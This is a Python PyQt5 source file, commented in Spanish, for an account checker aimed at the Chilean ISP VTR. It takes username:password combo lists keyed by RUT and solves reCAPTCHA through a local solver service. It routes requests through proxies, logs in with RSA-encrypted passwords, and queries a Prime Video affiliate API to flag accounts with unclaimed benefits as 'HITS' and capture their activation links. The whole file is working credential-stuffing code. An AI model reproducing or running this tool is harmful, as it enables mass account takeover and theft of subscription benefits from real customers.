import re
import requests
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend
import base64
import json
from threading import Thread
from PyQt5.QtCore import QObject, pyqtSignal

class CheckerWorker(QObject):
    result_signal = pyqtSignal(dict)
    log_signal = pyqtSignal(str)
    
    def __init__(self):
        super().__init__()
        self.session = requests.Session()
        self.is_running = True
    
    def validate_rut(self, rut_input):
        """Valida un RUT chileno"""
        rut = rut_input.strip()
        
        if ":" in rut:
            parts = rut.split(':', 1)
            rut = parts[0]
        
        limpio = rut.replace(".", "").replace("-", "")
        
        if len(limpio) == 0:
            return False, "RUT vacío"
        
        dv = limpio[-1].upper()
        cuerpo = limpio[:-1].lstrip('0') or "0"
        
        # Validar que cuerpo sea número y dv sea válido
        if not re.match(r'^\d+$', cuerpo) or not re.match(r'^[0-9K]$', dv):
            return False, "RUT inválido"
        
        # Calcular dígito verificador
        suma = 0
        multiplicador = 2
        
        for i in range(len(cuerpo) - 1, -1, -1):
            suma += int(cuerpo[i]) * multiplicador
            multiplicador = 2 if multiplicador == 7 else multiplicador + 1
        
        dv_esperado_num = 11 - (suma % 11)
        
        if dv_esperado_num == 11:
            dv_esperado = "0"
        elif dv_esperado_num == 10:
            dv_esperado = "K"
        else:
            dv_esperado = str(dv_esperado_num)
        
        if dv == dv_esperado:
            return True, f"{cuerpo}-{dv}"
        else:
            return False, "RUT inválido"
    
    def encrypt_password(self, password):
        """Encripta contraseña con RSA"""
        try:
            public_key_base64 = "MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBANgDJ1D8IOc8ZQpzJCnLujRc9Dt06ckrr1F8zTivMgAmFXlUv6Skbey+DZ4nZ/SAQgTFLpMm9i1/2BNabqFa5vsCAwEAAQ=="
            public_key_bytes = base64.b64decode(public_key_base64)
            
            public_key = serialization.load_der_public_key(
                public_key_bytes,
                backend=default_backend()
            )
            
            password_bytes = password.encode('utf-8')
            encrypted = public_key.encrypt(
                password_bytes,
                padding.PKCS1v15()
            )
            
            return base64.b64encode(encrypted).decode('utf-8')
        except Exception as e:
            self.log_signal.emit(f"✗ Error encriptando: {str(e)}")
            return None
    
    def solve_captcha(self, url, sitekey):
        """Resuelve CAPTCHA v2"""
        try:
            # Conectar a servidor local de resolución
            response = requests.post(
                "http://localhost:407/token",
                json={"url": url, "sitekey": sitekey},
                timeout=150
            )
            
            if response.status_code == 200:
                data = response.json()
                return data.get('token')
            else:
                self.log_signal.emit("✗ Error resolviendo CAPTCHA")
                return None
        except Exception as e:
            self.log_signal.emit(f"✗ Error CAPTCHA: {str(e)}")
            return None
    
    def check_vtr(self, combo, proxy=None):
        """Verifica una cuenta VTR"""
        try:
            parts = combo.split(':')
            if len(parts) < 2:
                return {
                    'status': 'BAD',
                    'rut': combo,
                    'captura': 'Formato inválido',
                    'link': None
                }
            
            user = parts[0]
            password = parts[1]
            
            # Validar RUT
            is_valid, rut_formatted = self.validate_rut(user)
            if not is_valid:
                self.log_signal.emit(f"✗ BAD = {user} (RUT inválido)")
                return {
                    'status': 'BAD',
                    'rut': user,
                    'captura': 'RUT inválido',
                    'link': None
                }
            
            self.log_signal.emit(f"🔍 Verificando: {rut_formatted}")
            
            # Configurar proxies
            proxies = None
            if proxy:
                proxies = {
                    'http': f'http://{proxy}',
                    'https': f'http://{proxy}'
                }
            
            # Paso 1: Obtener sesión inicial
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            session = requests.Session()
            session.headers.update(headers)
            
            # Obtener página de login
            url_login = "https://sp.tbxnet.com/v2/auth/vtr/login.html?idp=vtr2&return=https%3A%2F%2Faffiliates-api.tbxapis.com%2Fv1%2Fprocesses%2Fvtr_claro_cl%2Fbinding%2Finitiate?cp=prime"
            
            response = session.get(url_login, proxies=proxies, timeout=15, allow_redirects=False)
            
            if response.status_code not in [200, 302, 303, 307, 308]:
                self.log_signal.emit(f"✗ BAD = {rut_formatted} (Error conexión)")
                return {
                    'status': 'BAD',
                    'rut': rut_formatted,
                    'captura': 'Error de conexión',
                    'link': None
                }
            
            # Obtener CAPTCHA
            sitekey = "6Ldz5XEaAAAAAHyzCrh1TK53A22e-FSx0ukqyhmS"
            token = self.solve_captcha("https://accounts.vtr.com", sitekey)
            
            if not token:
                self.log_signal.emit(f"⚠ RETRY = {rut_formatted} (CAPTCHA timeout)")
                return {
                    'status': 'RETRY',
                    'rut': rut_formatted,
                    'captura': 'CAPTCHA timeout',
                    'link': None
                }
            
            # Encriptar contraseña
            password_encrypted = self.encrypt_password(password)
            if not password_encrypted:
                self.log_signal.emit(f"✗ BAD = {rut_formatted} (Error encriptación)")
                return {
                    'status': 'BAD',
                    'rut': rut_formatted,
                    'captura': 'Error encriptación',
                    'link': None
                }
            
            # Login
            url_auth = "https://accounts.vtr.com/commonauth"
            payload = {
                'name': rut_formatted.split('-')[0],
                'username': rut_formatted,
                'password': password_encrypted,
                'g-recaptcha-response': token,
                'sessionDataKey': 'session123'
            }
            
            response = session.post(url_auth, data=payload, proxies=proxies, timeout=15, allow_redirects=False)
            
            if 'login.fail.message' in response.text or 'login.fail.message' in response.headers.get('Location', ''):
                self.log_signal.emit(f"✗ BAD = {rut_formatted} (Credenciales incorrectas)")
                return {
                    'status': 'BAD',
                    'rut': rut_formatted,
                    'captura': 'Credenciales incorrectas',
                    'link': None
                }
            
            # Verificar Prime Video
            url_prime = f"https://affiliates-api.tbxapis.com/v1/partnergw/affiliates/subscriptions?toolbox_user_token=token&cp=prime&b=1783532374"
            
            headers_prime = {
                'Accept': 'application/json',
                'Authorization': 'vtr-a11c019950-f84338973c',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            response = session.get(url_prime, headers=headers_prime, proxies=proxies, timeout=15)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    
                    # Extraer información
                    estado = None
                    nombre_paquete = None
                    link_activacion = None
                    
                    for item in data.get('data', []):
                        if item.get('name') == 'PRIME':
                            estado = item.get('status')
                            nombre_paquete = item.get('name')
                            
                            entitlement = item.get('entitlement', {})
                            if 'activation' in entitlement:
                                link_activacion = entitlement['activation'].get('url')
                            break
                    
                    link_text = f" | Link: {link_activacion}" if link_activacion else ""
                    
                    if estado == 'BINDING_PENDING':
                        self.log_signal.emit(f"✓ HIT = {rut_formatted} | Pendiente{link_text}")
                        return {
                            'status': 'HITS',
                            'rut': rut_formatted,
                            'captura': f'Pendiente{link_text}',
                            'link': link_activacion
                        }
                    elif estado == 'BOUND':
                        self.log_signal.emit(f"⚠ CUSTOM = {rut_formatted} | Activado (Beneficio ya usado)")
                        return {
                            'status': 'CUSTOM',
                            'rut': rut_formatted,
                            'captura': f'Activado (Beneficio ya usado){link_text}',
                            'link': link_activacion
                        }
                    else:
                        self.log_signal.emit(f"⚠ CUSTOM = {rut_formatted} | Sin beneficios")
                        return {
                            'status': 'CUSTOM',
                            'rut': rut_formatted,
                            'captura': 'Sin beneficios',
                            'link': None
                        }
                except:
                    self.log_signal.emit(f"✗ BAD = {rut_formatted} (Error parsing)")
                    return {
                        'status': 'BAD',
                        'rut': rut_formatted,
                        'captura': 'Error al procesar respuesta',
                        'link': None
                    }
            else:
                self.log_signal.emit(f"✗ BAD = {rut_formatted} (Error API)")
                return {
                    'status': 'BAD',
                    'rut': rut_formatted,
                    'captura': f'Error API: {response.status_code}',
                    'link': None
                }
        
        except Exception as e:
            self.log_signal.emit(f"✗ ERROR = {user} ({str(e)})")
            return {
                'status': 'BAD',
                'rut': user,
                'captura': str(e),
                'link': None
            }
